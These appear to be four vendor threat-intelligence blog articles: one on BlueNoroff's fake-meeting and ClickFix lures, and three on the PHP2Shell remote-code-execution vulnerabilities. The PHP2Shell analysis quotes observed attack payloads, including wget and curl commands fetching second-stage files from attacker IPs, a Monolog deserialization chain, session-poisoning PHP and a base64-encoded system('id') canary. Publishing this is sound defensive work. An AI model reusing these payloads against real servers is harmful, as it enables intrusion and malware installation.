articles.title: Still in the Meeting: BlueNoroff Six Months On
articles.context: We have leveraged threat intelligence around this threat activity to enhance detections in the Aurora® Superintelligence Platform and Aurora® Endpoint Security, subject to...
articles.full_text:
In April, Arctic Wolf Labs documented how BlueNoroff used fake Zoom and Microsoft Teams meetings, ClickFix prompts, and AI-generated participants to compromise leaders in the Web3 and cryptocurrency sector. We expected the threat actor to adapt after we published that report. Instead, BlueNoroff spent the next six months meticulously changing almost every red-flag “tell” a target can see, but changed almost nothing about how the intrusion itself works.

Now, the fake meeting is no longer the lure. Through access to the threat actor’s own infrastructure, Arctic Wolf tracked BlueNoroff expanding its operation into the everyday workflows of crypto and venture-capital professionals. New lures have been set up to target high-ranking targets such as founders, CEOs and senior executives, in the form of shared financial documents, PDF viewer updates, fake media players, identity verification prompts, hardware-wallet access, and security audit workflows.

This blog offers a brief overview of our findings. Full details of our investigations into BlueNoroff’s latest campaign tactics can be found in our new white paper on the topic.

What’s Inside the Full Report

A tour of BlueNoroff’s lure factory. New lure themes we uncovered appeared as custom artwork, operator guides, and test scripts in the actor’s media library before going live. We walk you through one end to end: a fabricated media player named NovaStream that progressed from AI-generated artwork to a fully operational malicious delivery kit.

Same trick, new pretext. Every lure still follows the same pattern. The threat actor establishes professional trust with the intended target, manufactures a technical problem, and persuades the target to run a “fix” that retrieves the next stage of the attack.

A wider net, with leadership the primary target. The number of individuals we identified in BlueNoroff’s media library grew from roughly 400 (of which we independently verified 100 in our April report), to 677 individuals across 58 countries. Founders and C-suite executives make up 84% of that total. These counts describe who the threat actor prepared material against, not confirmed compromises.

Custom guides help targets compromise themselves. BlueNoroff crafts “helpful” instruction videos that walk targets past browser warnings and through unfamiliar macOS and Windows workflows.

AI as a production multiplier. Generative AI now supplies attackers with platform artwork, avatars, and realistic synthetic participant video at a much higher volume and degree of realism. We show how we identified deepfakes using provenance evidence rather than visual inspection, and why AI sped up the operation.

New infrastructure with familiar habits. The BlueNoroff campaign moved to a coordinated cluster of servers, but its naming conventions, delivery commands, and certificate habits tie it directly back to the April activity. We document 98 high-confidence domains, 73 of which had not been previously reported.

How to protect yourself and your organization. We provide a robust Appendix of tips for defenders, including detection opportunities, MITRE ATT&CK® information, YARA rules, and a full list of Indicators of Compromise (IOCs).

Meet BlueNoroff

Back in April, our Adversary Operations team identified and tracked BlueNoroff activity as part of our ongoing threat research investigations. During that process, we uncovered infrastructure, targeting patterns, and operational tactics associated with the group’s campaigns, and realized we had something larger on our hands.

BlueNoroff is a financially motivated subgroup of North Korea’s Lazarus Group, publicly attributed to the DPRK’s Reconnaissance General Bureau (RGB). The group has been active since at least 2014 and is highly focused on revenue generation through theft of cryptocurrency and financial assets. BlueNoroff primarily targets individuals with access to, or influence over digital assets, particularly those who have authority and trust, and uses social engineering techniques to gain access to systems, credentials, and digital assets.

In more recent years, the group’s activity has been heavily focused on the Web3 and digital asset ecosystem, and the latest campaign Arctic Wolf observed tells its own story along well-worn lines.

How BlueNoroff Helps Targets Compromise Themselves

We’ve all been there: we’re about to hop on a long-awaited Zoom call with a peer or a prospect when the audio breaks, or the video connection fails. Our blood pressure and stress levels rise as we search for a “quick fix.” That very human response is what BlueNoroff counts on, so they can covertly hand targets the means to infect themselves: a popup that we might expect to see appear while having technical troubles, with helpful instructions that guide the target through running commands or clicking buttons they might ordinarily think twice about interacting with.

The BlueNoroff Cycle of Compromise

In our April report, we showed how BlueNoroff secretly recorded the live webcams of targeted individuals as they tried to fix a fake Teams or Zoom call with no audio. What the targets didn’t know was that all the other “participants” on the call were either deepfakes, static profile pictures scraped from the internet, or pre-recorded stolen footage from other people they knew. As they tried unsuccessfully to fix the call’s audio, their own accounts were covertly compromised and plundered for contacts.

Each newly compromised target yielded real video material to populate future fake meetings, plus contacts for BlueNoroff to reach out to others in the target’s professional circle.

BlueNoroff’s foundational social engineering cycle.

What’s New in This Campaign

Over the last six months or so, Arctic Wolf Labs observed a significant evolution in both the scale and the complexity of this operation. Back in April, through access to the threat actor’s media library, we identified 400+ targets (100 of whom we independently verified) spread over 20 countries. In more recent months, we’ve identified 677 targets across 58 countries, and observed through continuing access to that same media library that BlueNoroff’s social engineering pipeline has changed at both ends.

Upstream, reconnaissance has both widened and become more deliberate. Lure material has been scraped not just from profile photos and prior victims’ webcam streams, but from YouTube interviews and conference talks, which are screen-recorded by the actor. This allows them to capture a specific person’s likeness and voice – a founder perhaps, or a CEO – and then create fake meeting footage without having to directly compromise the target themselves.

BlueNoroff’s updated attack flow (Click to enlarge).

Manipulated Media

Downstream, the “recycling” loop that turns compromised victims into material for the next scam has sped up and improved. By November 2026, production had moved from one editor on one laptop using Adobe Premiere to create basic deepfakes (which we documented back in April), to a full chain of generative AI-based services. BlueNoroff is now using and combining legitimate tools including Google Generative AI, Grok Imagine, Wondershare AIGC and GPT-4o to create a more mature editing workflow, and the videos they produce can no longer be distinguished from genuine webcam footage by visual inspection alone.

As a result, we based all deepfake determinations on provenance evidence rather than appearance. Arctic Wolf uses the U.S. Government Accountability Office definition of a deepfake: video, audio, or imagery generated or manipulated with AI to create, replace, or alter a person’s likeness or synthesize speech. Media edited exclusively with legitimate production tools such as Adobe Premiere Pro, Microsoft Clipchamp, or Wondershare without an observed generative AI step was classified as manually manipulated content rather than a deepfake.

Our forensic analysis of 349 videos in BlueNoroff’s media library flagged as “likely modified” as of November 6. A video with several signatures appears in several ribbons (Click to enlarge).

New Lure Themes

Instead of relying on their previous “fake meeting” ruse, BlueNoroff now leverages multiple lure themes to socially engineer targets and deliver payloads through platform-specific workflows. Although the branding, content, and delivery mechanisms varied, each lure followed the same underlying pattern. The document-themed lures we observed used several related pretexts: a protected file could not be decrypted, a shared document required verification, or the browser’s PDF viewer needed an update.

One of the platform-specific lures we observed used a fake Chrome PDF Viewer that claimed that Chrome’s built-in PDF component could not display a document without an update. Selecting “Update Now” initiated an AppleScript download in the recovered macOS flow. Windows and Linux users were instructed to execute commands that retrieved a payload from a fake Chrome update site set up by the threat actor.

After execution, the page displayed a Chrome-branded “Update Complete” dialog, reproducing the false-success mechanism observed in the earlier fake-meeting intrusions.

Fake Chrome update popup lure created by BlueNoroff. Clicking “Update now” initiates an AppleScript download.

Conclusion

BlueNoroff’s new lures and intrusion scenarios (painted in more detail in our full report) align closely with common workflows in venture fundraising and digital-asset investment, where pitch decks, investment agreements, and restricted documents move between founders, investors, and advisers. By aligning lures with fundraising, investment, scheduling, media, wallet, and security workflows, BlueNoroff places malicious execution inside activities that targets routinely perform.

Combined with their new fake media generation capabilities to produce varied and credible lure content, this presents a significant escalation in BlueNoroff’s efforts to compromise high-value individuals who control funds, signing keys, sensitive information, authenticated communications, and trusted professional relationships.

While AI is now being used as production multiplier that helps BlueNoroff scale and diversify, it has not fundamentally changed the intrusion mechanism. The campaign still remains dependent on target research, operator engagement, tailored infrastructure, and manual user execution.

Why it Matters

Individual brands, domains, and visuals used as lures by attackers will keep changing. The step they all depend on remains the same: a trusted-looking page asks the target to run something locally, which most often involves a manual step like clicking a button on a popup. That behavior is the most reliable place to disrupt this campaign, and our report includes the detection logic, MITRE ATT&CK mapping, YARA rules, and indicators of compromise to help defenders protect their organizations against these types of social engineering attacks.

The TL;DR takeaway: treat any request to run a command, script, shortcut, or workflow as a red flag, however polished the interaction looks, and confirm unusual requests through a separate, out-of-band known-good channel.

Get the full analysis, detections, and indicators. Download the full report (PDF).

How Arctic Wolf Protects Its Customers

Arctic Wolf is committed to ending cyber risk, and when active campaigns are identified, we move quickly to protect our customers. We have leveraged threat intelligence around this threat activity to enhance detections in the Aurora® Superintelligence Platform and Aurora® Endpoint Security, subject to customer environment and available telemetry. Arctic Wolf Aurora® Managed Detection and Response (MDR) provides detection for the PowerShell, curl-piped and osascript execution patterns plus the process-injection and persistence techniques documented in our April report, and the network indicators in our November report.

As this campaign develops, Arctic Wolf may refine detections for additional indicators of compromise and techniques leveraged by this threat.

Recommended Mitigations

While no organization is immune from social engineering attacks, there are steps that can be taken to minimize the likelihood of an intruder succeeding in gaining a foothold. While BlueNoroff’s campaign may seem sophisticated, their attack chain goes nowhere when their intended victim exercises basic security hygiene.

We recommend the following additional mitigations:

Verify unexpected requests. Organizations should focus on teaching employees at every level of the company to exercise caution around unexpected requests of all types, which strengthens internal defenses against social engineering. Train employees to independently verify meeting invitations and identity verification requests through a separate trusted channel.

Beware of third parties bearing gifts. Be wary of “helpful” materials sent by an external contact, particularly PDFs and links to videos and other recordings, even those that seem legitimate or contain known/trusted company and brand names.

Beware of scams that involve fake “fixes.” Be particularly cautious of requests to install software, run scripts, or execute commands, especially during meetings, videos, phone calls, and other seemingly personal interactions that create a sense of urgency.

Provide deepfake training. Train employees to recognize modern social engineering techniques, including the use of AI-generated content and deepfakes by those seeking access to company credentials. For those without the time or resources to create their own training program, the Arctic Wolf Managed Security Awareness® training solution includes content on fake-meeting and ClickFix social engineering, including a “Report Phish” button.

Recognize leadership as the primary target set. C-suite executives and founders account for 84% of identified targets in the BlueNoroff campaign we observed. Implement strong authentication and access controls for high-risk users, including executives and employees with access to company finances or digital assets.

About Arctic Wolf Threat Intelligence

Arctic Wolf Threat Intelligence enables organizations to leverage the same intelligence that powers the Arctic Wolf Security Operations Center (SOC), delivering real-time data on emerging threats. With curated reporting and real-time threat campaign notifications, businesses stay informed and increase prevention without needing to sift through vast amounts of information.

Arctic Wolf Threat Intelligence leverages over 8 trillion weekly security observations across 10,000+ customers, spanning industries and geographies, and provides actionable insights in an easy-to-digest format even outside Arctic Wolf. With IoC QuickLinks into Data Explorer, customers can rapidly check their environments for active threats, and take swift action to mitigate risks.

The insights generated can be automatically operationalized across Security Operations technologies, including EDR, SIEM, and network security controls, leveraging industry-standard integrations such as STIX/TAXII and dynamic blocklist APIs to accelerate detection and response. Arctic Wolf’s Threat Intelligence solution is available as an MDR add-on or a standalone deliverable.

Read our April report on BlueNoroff: BlueNoroff Uses ClickFix, Fileless PowerShell, and AI-Generated Fake Zoom Meetings to Target Web3 Sector

articles.title: PHP2Shell Is a Wake-Up Call for Every Business Leader
articles.context: AI is changing how vulnerabilities are discovered and exploited for defenders and attackers alike, and the practical effect is that the time organizations have between a flaw...
articles.full_text:
AI is changing how vulnerabilities are discovered and exploited for defenders and attackers alike, and the practical effect is that the time organizations have between a flaw being found and a flaw being exploited keeps shrinking. Today, we have more known vulnerabilities than at any point in history, and they’re being exploited faster than ever. Nearly 87% of exploited vulnerabilities in 2026 have been exploited before or on the day they were disclosed, up from 48% in 2024 and just 19% in 2018, according to zerodayclock.com, a neutral, independent observatory for cybersecurity telemetry.

More code, more bugs, and AI-aided discovery have all influenced this volume. The systems exposed are often the same systems that run revenue, operations, and customer relationships. Leaders now need to focus on something bigger than prevention alone. They need to build cyber resilience, the ability to withstand an attack, continue operating, and recover quickly. Every organization is racing against the clock to build that resilience.

We saw this play out recently during a week that saw multiple high-profile vulnerabilities and security incidents emerge in rapid succession. PHP2Shell, the name given to two critical remote code execution (RCE) vulnerabilities in PHP, became one of the most visible examples of how quickly newly disclosed flaws can become immediate operational risks. Researchers using frontier AI models identified the flaws and worked with the PHP Foundation to prepare fixes, but details leaked before the planned release. Patches were pushed early, but between the time the vulnerability was disclosed and the patch was available, exploitation attempts began appearing almost immediately. Our Arctic Wolf Labs researchers used aggregated, anonymized telemetry from across our customer community to spot spikes in scanning activity and to analyze exploitation attempts and uncover attacker payloads tied to PHP2Shell. Labs also replicated attacker techniques in controlled environments.

Those findings fed new detections, threat hunt queries, and immediately valuable customer remediation guidance, but detection and response work like this is most effective when an organization already knows what it needs to protect. While PHP2Shell captured much of the industry’s attention, it was only one example in a week that underscored how quickly new exposures can emerge across technologies and attack surfaces. The broader lesson is that organizations need resilience before the next disclosure arrives, and that the time to build cyber resilience into an organization’s ecosystem is now. Jason Clinton, Deputy CISO at Anthropic, warned on X following the PHP2Shell disclosure that security leaders need to prepare their boards as soon as possible for the new threat landscape.

“As bad as things have gotten in the past 4 days, they are going to get a lot worse before they get better. security leaders, never let a crisis go to waste: please go to your boards and ask for help right now. not for ai, for the basics. (we need to hold on for ~18 months.)” — Jason Clinton, Deputy CISO at Anthropic

Organizations best positioned during that window already knew where PHP ran in their environment, which of those systems faced the internet, and how quickly they could patch, restart, and verify each one. A flaw in a system you cannot see cannot be fixed in the hours that matter. Those are the basics boards need to fund. Because the gap between discovery and exploitation will keep shrinking, the organizations that win the race against the clock are the ones that build that foundation of continuous visibility into their attack surface and disciplined exposure management before the next disclosure arrives.

Machine Speed Is the New Normal

AI accelerated both sides of the PHP2Shell situation timeline. The underlying flaws in the code had reportedly been in PHP for years, and turning them into a usable exploit required a level of complexity that would have been extremely difficult and time-consuming for most researchers to achieve on their own. Attackers gain the same AI efficiencies defenders do. They’re using AI to write malware, build exploits, find vulnerabilities, and automate actions. This means the gap between a flaw being disclosed and being exploited will keep narrowing. Patching alone cannot keep pace when that gap is just a few hours long.

In many circumstances, a vulnerability is disclosed before a patch is available. PHP2Shell showed us that. In those moments, security leaders need a way to detect exploit attempts and respond effectively. Machine speed meets that moment, especially when an exposure is widespread, and security leaders should recognize that machine-speed attack and defense are the new normal.

That shift has implications far beyond the security team. Cyber risk now deserves the same level of ownership, accountability, and investment as financial and operational risk. Boards and executive teams need to treat security as a business issue, not just a technical one. That starts with the fundamentals, including maintaining an accurate inventory of assets, applying patches on a defined timeline, enforcing strong identity controls, and maintaining continuous visibility across the environment. These aren’t new security practices, but they become far more important as AI compresses response timelines. You can’t remediate a vulnerability in hours if you don’t know the system exists.

The Four Fundamental Principles of Threat Protection for the AI Era

Vulnerabilities aren’t the only path to a breach. Initial access comes from social engineering (which is scaling with AI), internet-facing misconfigurations, and internet-facing vulnerabilities. Once an attacker is inside, more internal exposure means faster movement. We want to close the opportunity through configuration health and security hygiene.

Security fundamentals only work when teams can operationalize them consistently.

Exposure management strategies turn security hygiene upkeep into a repeatable process. Start with full visibility of your attack surface, including shadow IT and configuration gaps. Then connect asset management with vulnerability and patch management so each cycle improves on the last. Find known and hidden assets, assess them in the context of one another, identify where vulnerabilities are present and controls are missing, and mitigate the highest impact exposures first.

True resilience requires a continuous cycle of risk mitigation over time. Fewer exposures mean fewer opportunities for attackers, and organizations of every size can better defend against AI-driven threats with AI-driven defense and expert oversight. That means operating at machine speed with experts overseeing the work, and it requires knowing your environment, maintaining strong security fundamentals, and responding quickly when new threats emerge. In an era of machine-speed attacks, resilience belongs to organizations that can move just as fast.

Security operations must evolve as well. Human-only processes can’t keep pace with the speed and volume of modern threats. At the same time, fully autonomous security without oversight introduces its own risks. AI should handle most of the volume of investigation that slows down teams, while experienced analysts focus on validation, judgment, and the genuinely complex threats that require context. We’ve built Arctic Wolf around that principle. Our patent-pending Swarm of Experts™ combines specialized AI agents with expert human oversight, allowing us to operate at machine speed. Large teams of AI agents perform investigations, analysis, and response activities at scale, while experienced security experts remain involved where judgment matters most.

Leaders also need to prepare for the reality that one day, their organization may fall victim to AI-driven adversaries, with tested response plans and the ability to restore operations quickly. As the threat landscape rapidly evolves, this scenario appears increasingly likely, especially for businesses that lack the resources to staff their own security team.

We built Arctic Wolf for moments like this one. Internal staffing around the clock is difficult and costly, even for large organizations. Attackers don’t care about holidays, and AI cares even less. That’s why a partner matters. By combining AI-driven automation with expert human oversight, we help customers respond with speed and confidence when new risks emerge. Through our global partner ecosystem, we’re bringing that capability to organizations around the world and helping security leaders turn cyber risk into cyber resilience.

PHP2Shell won’t be the last vulnerability to remind us how quickly the threat landscape can change. This isn’t a risk to sleep on or push to next year’s budget. The time to act is now. The organizations that come through these moments will be the ones that understand their environments, maintain strong security fundamentals, and can respond decisively when new threats emerge. There has never been a better time to get proactive about cyber resilience.

This blog reflects the author’s views as of the publication date and contains forward-looking statements and opinions about technology trends. Actual outcomes may differ based on attacker behavior, customer environments, and broader market and regulatory developments.

articles.title: PHP2Shell: Critical PHP Vulnerabilities Enable Unauthenticated Remote Code Execution
articles.context: Arctic Wolf Labs leverages resulting artifacts from these simulations, as well as observed exploit techniques, attacker tradecraft, and emerging indicators of attack/compromise...
articles.full_text:
Executive Summary

On October 21, 2026, the PHP development team released emergency security updates addressing two critical vulnerabilities, CVE-2026-109618 and CVE-2026-109619, collectively referred to by researchers as PHP2Shell. Both vulnerabilities carry a CVSS v4.0 score of 9.2 (Critical Severity) and can allow an unauthenticated attacker to execute code with the privileges of the affected PHP worker process.

The vulnerabilities affect PHP installations that process web requests, including PHP-FPM, Apache deployments using mod_php, php-cgi, FrankenPHP, and LiteSpeed. The PHP security team considers Apache mod_php the highest-risk configuration because researchers demonstrated exploitation through a single unauthenticated request before application code begins executing.

Key findings

Arctic Wolf Labs observed widescale scanning and active exploitation attempts targeting PHP2SHELL shortly after disclosure. Activity ranged from basic checks for vulnerable PHP session upload-progress behavior, to attempts to validate PHP and operating system (OS) command execution.

Observed scanners used several techniques to validate exposure. These included inert PHP canaries, unique output markers, attacker-controlled session identifiers, session-poisoning attempts, and local-file-inclusion chains designed to determine whether injected PHP content could be evaluated.

Arctic Wolf Labs identified likely weaponized exploitation attempts involving second-stage payload delivery. Requests associated with 92.118.112[.]100 attempted to collect host and process-account information, print execution-confirmation markers, change to /tmp, and retrieve additional files using wget.

Analysis of the associated infrastructure identified payloads linked to the Potassium botnet. The investigation also uncovered Ethereum Name Service records containing recently updated IP addresses, although the available evidence does not show that the malware retrieved or used those records operationally.

Details

Arctic Wolf Labs observed a likely weaponized PHP2Shell exploitation attempt that combined command-execution validation with second-stage payload delivery. The request attempted to run id, print the marker PHP2SHELL_CONFIRMED, change to /tmp, and download a file from external IP address 92.118.112[.]100. The command sequence appeared repeatedly across padded form fields, potentially to influence memory layout or improve exploit reliability.

echo PHP2SHELL_CONFIRMED;cd /tmp; wget hxxp://92.118.112[.]100/nfs-setup

We observed a second weaponized payload associated with the same server. Embedded within repeated, heavily padded multipart fields, the command sequence attempted to enumerate the operating system and execution account, print a distinctive marker, and download an additional file from the previously observed payload host. The attempted second-stage delivery distinguishes this activity from non-destructive vulnerability validation and indicates clear exploitation intent.

system.uname -a; id; echo REDACTED OFFENSIVE;wget hxxp://92.118.112[.]100/REDACTED OFFENSIVE;

Further analysis of the payload-hosting infrastructure identified two malicious binaries associated with Potassium, a Mirai-derived botnet family first identified in March 2026 by Synthient and named after its C2 subdomain. Available telemetry did not establish that the observed PHP2Shell requests downloaded or executed either sample.

Both use these values to encrypt operational strings, including command-and-control domains, file paths, shell and process names, and the process kill list.

Ethereum Name Service Resolution

Both builds contain configuration for resolving command-and-control infrastructure through Ethereum Name Service (ENS), including two .eth names, seven public Ethereum RPC endpoints, and 32 text-record keys labeled “ip” through ip32. This would allow the malware to retrieve multiple command-and-control addresses without relying on conventional DNS.

ENS resolution was disabled in both samples, indicating that the capability was present but inactive. If enabled in future variants, it could complicate disruption by reducing reliance on registrars and DNS providers, requiring defenders to block the ENS names, RPC infrastructure, and resolved command-and-control addresses.

From Canaries to Command Execution

Following public disclosure, Arctic Wolf Labs observed widespread automated activity targeting PHP’s session upload-progress functionality. The requests ranged from basic checks for vulnerable behavior to session-poisoning chains and explicit attempts to validate operating-system command execution.

The variation in request structure, markers, session identifiers, and payloads indicates that multiple scanners and proof-of-concept (PoC) implementations were active. Although these requests demonstrate increasingly aggressive exploitation intent, request telemetry alone does not establish that the targeted systems were vulnerable or that code execution succeeded.

Probing the Upload-Progress Code Path

Some scanners performed basic checks intended to reach the affected PHP request-processing path. One self-identifying scanner supplied a controlled session identifier, activated PHP’s upload-progress functionality, and uploaded approximately 63 KB of repetitive data.

User-Agent: php2shell-scan/109618 Cookie: PHPSESSID=<REDACTED_SESSION_ID> Content-Type: multipart/form-data; boundary=B7kQpoc618 Content-Length: 62935 Connection: close

–B7kQpoc618 Content-Disposition: form-data; name=”PHPSESSID”

<REDACTED_SESSION_ID> –B7kQpoc618 Content-Disposition: form-data; name=”PHP_SESSION_UPLOAD_PROGRESS”

x –B7kQpoc618 Content-Disposition: form-data; name=”f”; filename=”a” AAAA…[truncated]…

The repetitive file content may have been intended to exercise the vulnerable upload-processing path or validate exploit prerequisites. The request did not contain executable PHP or an operating-system command, making it more consistent with vulnerability probing than an attempt to deliver a final payload.

Testing Session Poisoning and File Inclusion

Other requests tested whether attacker-controlled PHP could be written into session upload-progress data and subsequently evaluated through a local file inclusion vulnerability.

One request supplied a predictable session identifier and attempted to include the corresponding session file through a page parameter:

POST /vuln.php?page=/var/lib/php/session/sess_p2sopchain000000000000 HTTP/1.1

The request embedded the following PHP in uploaded filename metadata:

<?php echo ‘P2SOP-‘.PHP_VERSION. ‘-EXEC-‘.php_uname(‘n’). ‘-WPC-‘.intval(@file_exists(‘wp-content/db.php’)); ?>

If successfully stored and evaluated, the payload would return the PHP version, server hostname, and the result of a check for a WordPress-related file. The request exposes the scanner’s intended exploit chain, but it does not prove that the supplied session path matched the target’s configuration or that the application included the session file.

Session Poisoning Versus PHP2Shell Exploitation

Arctic Wolf Labs also observed requests that appeared to conflate PHP2Shell with older PHP session-poisoning techniques. One example activated PHP’s upload-progress functionality and embedded a serialized Monolog object within uploaded filename metadata:

Cookie: PHPSESSID=pcw8189d05b0b3e4ffb PHP_SESSION_UPLOAD_PROGRESS=x filename=”x|O:32:\”Monolog\Handler\SyslogUdpHandler\”…”

The serialized object contained a Monolog gadget chain configured to execute:

curl -s hxxp://45.115.26[.]26:8000/cCmono

The serialized object ultimately attempted to execute a command that would download a second-stage payload named cCmono from a remote server. Arctic Wolf Labs was unable to retrieve the referenced file during analysis and could not independently verify the payload that may have been delivered.

Unlike the command-execution validation payloads discussed previously, this request does not appear to target the memory-corruption mechanisms underlying PHP2Shell. Instead, it attempts to leverage PHP’s session upload-progress feature to place attacker-controlled content into session storage, potentially for use in a subsequent local file inclusion or unsafe deserialization chain.

Successful exploitation would require additional application-specific conditions beyond the PHP vulnerabilities themselves, such as the ability to retrieve and deserialize attacker-controlled session data and the presence of compatible Monolog classes. The request demonstrates malicious intent but does not independently establish exploitation of CVE-2026-109618 or CVE-2026-109619.

Inert Canaries and Execution Markers

Several scanners used PHP canaries to test whether attacker-controlled content reached session data or an executable context.

The least intrusive sample contained an explicitly inert PHP block:

<?php /* php2shell-scan inert canary */ ?>

Because the block contains only a comment, it does not execute a command, collect system information, or produce output. It appears designed to test whether PHP syntax could be introduced into upload-progress data without attempting to demonstrate code execution.

Other scanners used output-producing canaries. A Nuclei-based request embedded a unique marker in uploaded filename metadata:

<?php echo ‘NUCLEIve97RH0fzh’; ?>

If a subsequent file-inclusion request caused PHP to evaluate the poisoned session data, the marker would appear in the server response and allow the scanner to correlate the result with the original request.

Another scanner placed two fixed markers in both the upload-progress value and filename:

<?php echo ‘P2SFNAME’; echo ‘P2SVALUE’; ?>

The associated session identifier ended in .php, suggesting that the scanner may also have been testing whether the session identifier influenced a filename that could later be reached or evaluated by the web server. The .php suffix reflects the scanner’s apparent assumption, however, and does not establish that PHP created a web-accessible file with that name.

These output canaries are non-destructive, but they go beyond inert injection checks. If returned by the server, they would provide evidence that attacker-controlled PHP reached an executable context.

Validating Operating-System Command Execution

The most intrusive scanning activity attempted to validate execution beyond the PHP interpreter. Multiple requests embedded PHP that decoded and ran the Unix id command:

<?php echo ‘RCE_noyzzg0YVLBU’; system(base64_decode(‘aWQ=’)); echo ‘RCE_noyzzg0YVLBU’; ?>

The Base64 value aWQ= decodes to id. If successful, the payload would return the user and group identity of the affected PHP worker process.

The unique RCE_ strings bracket the expected command output, allowing an automated scanner to locate it within an HTTP response and associate the result with a specific request. Arctic Wolf Labs observed multiple markers, including repeated use of the same value, which may indicate retries, injection into multiple request fields, or repeated testing of the same target.

These payloads represent active RCE validation rather than passive scanning. However, the presence of the payload in a request does not independently establish that PHP evaluated it or that the operating-system command executed successfully. Confirmation would require corresponding response content, process telemetry, or other server-side evidence.

Vulnerability Overview

The vulnerabilities arise from separate weaknesses in PHP’s handling of request memory and abnormal execution states:

CVE-2026-109618 can cause memory corruption when an out-of-memory condition interrupts PHP while internal request data is only partially initialized.

CVE-2026-109619 can allow request-owned global state to remain accessible after its backing memory has been freed, creating a stale-state condition that a later request may reuse.

Vulnerability

Description

Impact

Severity

CVE-2026-109618

Memory corruption during out-of-memory handling

Unauthenticated remote code execution

CVSS v4.0 9.2

CVE-2026-109619

Reuse of stale request-owned global state after memory is freed

Unauthenticated remote code execution, with possible memory disclosure

CVSS v4.0 9.2

Both vulnerabilities affect PHP’s internal request-processing lifecycle. As a result, exposure does not necessarily depend on a vulnerability in the application running on top of PHP. Any reachable PHP script may expose the underlying request-processing path under the required conditions.

Affected Deployment Models

The PHP project identifies the following web-serving configurations as at risk:

Apache with mod_php

PHP-FPM

php-cgi

FrankenPHP

LiteSpeed

Products and appliances that embed or bundle PHP

Apache mod_php presents the most clearly demonstrated risk because exploitation can reportedly occur through one unauthenticated request before the target application receives control. Other deployment models remain affected, but exploit requirements and worker-state behavior may differ.

Public PoC material is available, and multiple security organizations have independently reproduced at least one exploitation path. Public reporting from security vendors also indicates that exploit attempts began around the time of disclosure, although the scale and success of that activity remain incompletely established.

Organizations should immediately update to PHP 8.5.12, 8.4.27, 8.3.36, or 8.2.35. Systems running unsupported PHP versions may require an operating-system or long-term-support vendor backport, an appropriate upstream source backport, or migration to a supported branch.

Conclusion

PHP2Shell attracted significant attention because of its severity, PHP’s widespread use, and its discovery through AI-assisted security research. According to OpenAI, researchers participating in its Patch the Planet initiative used frontier AI models, alongside expert human review, to help identify and validate the vulnerabilities.

Early exploitation has been more limited than the initial attention suggested. Arctic Wolf telemetry and public reporting show widespread scanning, exploit validation, and isolated attempts to deliver second-stage payloads, but comparatively little evidence of reliable exploitation at scale.

The activity observed following disclosure also highlights a broader challenge for defenders: publicly released proof-of-concept code is often modified, repackaged, and rapidly redistributed. Arctic Wolf Labs observed PHP2Shell-themed requests that appeared to reuse older session-poisoning and deserialization tradecraft rather than the memory-corruption mechanisms underlying CVE-2026-109618 and CVE-2026-109619. As a result, defenders should avoid assuming that every PHP2Shell-themed request represents successful exploitation or even an attempt to exercise the newly disclosed vulnerabilities. Instead, organizations should focus on identifying evidence of the specific exploitation conditions required by the vulnerabilities themselves.

Because PHP2Shell was publicly disclosed only on October 21, 2026, the exploitation landscape may change quickly. Organizations should upgrade affected PHP installations, restart the relevant workers, and continue monitoring for command execution and second-stage payload delivery.

How Arctic Wolf Labs Turns Telemetry Into Outcomes

Arctic Wolf Labs is our threat intelligence and research team. Global security operations center (SOC) telemetry visibility drives a shared defense, while active network monitoring gives Labs an early warning system across our global customer base.

Using telemetry from across the Arctic Wolf customer community, researchers identify spikes in scanning activity, analyze exploitation attempts, and uncover attacker payloads associated with PHP2Shell. We use those findings to develop and fine-tune detections to respond to malicious activity faster. This helps customers detect PHP2Shell activity they may have not observed yet in their unique environment.

Labs researchers also replicate attacker techniques against PHP2Shell vulnerabilities in controlled environments. Arctic Wolf Labs leverages resulting artifacts from these simulations, as well as observed exploit techniques, attacker tradecraft, and emerging indicators of attack/compromise (IOA/IOC), to develop new detections, threat hunt queries, and inform customer remediation guidance. As threat behavior evolves, we continuously apply the latest intelligence across customer environments.

articles.title: Arctic Wolf Labs: Finding, Prioritizing, and Patching PHP2Shell Exposure
articles.context: On Tuesday, October 20, threat actors gained advance visibility into two critical PHP vulnerabilities after details leaked ahead of the planned disclosure, accelerating the race...
articles.full_text:
On Tuesday, October 20, threat actors gained advance visibility into two critical PHP vulnerabilities after details leaked ahead of the planned disclosure, accelerating the race between defenders and attackers. The flaws are tracked as Common Vulnerabilities and Exposures (CVE) identifiers CVE-2026-109618 and CVE-2026-109619. Together they’re known as PHP2Shell. Both carry a 9.2 rating on the Common Vulnerability Scoring System (CVSS) version 4.0 scale. For both vulnerabilities, Arctic Wolf’s Aurora® Agentic SOC helps organizations rapidly identify affected assets, correlate exploitation signals across the environment, and accelerate investigation and response before attackers can establish persistence.

An unauthenticated attacker can use either flaw to run code on a vulnerable server. On Wednesday, October 21, the PHP project released patched versions. PHP2Shell shows how AI is changing the threat landscape. Attackers can now find and weaponize old flaws in widely used technology faster than ever before. Arctic Wolf recommends treating every PHP installation that serves web requests as at-risk presently. Internet-facing Linux web servers without endpoint monitoring carry the highest risk of quiet compromise.

Patching remains the recommended remediation. Security teams should assess exposure immediately, identify likely attack paths, and segment critical systems to limit an attacker’s ability to move through the environment. If attackers exploit PHP2Shell, Aurora Agentic SOC is designed to detect the activity that follows, including webshell deployment, unauthorized command execution, persistence attempts, and lateral movement, enabling rapid investigation and response before attacks can escalate.

Overview and Impact

All PHP installations that serve web requests are at risk. That includes PHP-FPM (FastCGI Process Manager), Apache with mod_php, php-cgi, FrankenPHP, and LiteSpeed. PHP rates the risk highest for mod_php. In PHP’s demonstrated exploit, an unauthenticated request triggers the attack before any application code runs.

PHP runs WordPress, Drupal, Joomla, and Magento sites, shared hosting platforms, and control panels like cPanel and Plesk. Many vendor applications bundle PHP without saying so, which makes the affected assets hard to find. Bundled standalone binaries such as php.exe and php-cgi.exe on Windows are easy to miss.

Understanding the Root Cause

CVE-2026-109618 is an out-of-memory handling flaw. PHP can stop while internal request data is only partly set up. Request cleanup may then treat that invalid data as valid.

CVE-2026-109619 is a stale state flaw. Request-owned internal state can survive after its memory is freed. A later request on the same worker may use that stale state before normal setup resets it. The PHP session upload progress feature is one confirmed path to this flaw, and it’s enabled by default.

Guidance for Arctic Wolf Customers

Inventory every system that runs PHP. Include package-based installs, containers, appliances, and hosting panels. Include vendor software that bundles PHP. Include continuous integration and continuous delivery (CI/CD) images.

Identify the PHP branch and package source on each system.

Update to the patched version or confirm your vendor has backported both fixes. Patch internet-facing systems first.

Restart every affected service. That covers PHP-FPM, Apache, NGINX upstream pools, application workers, and containers.

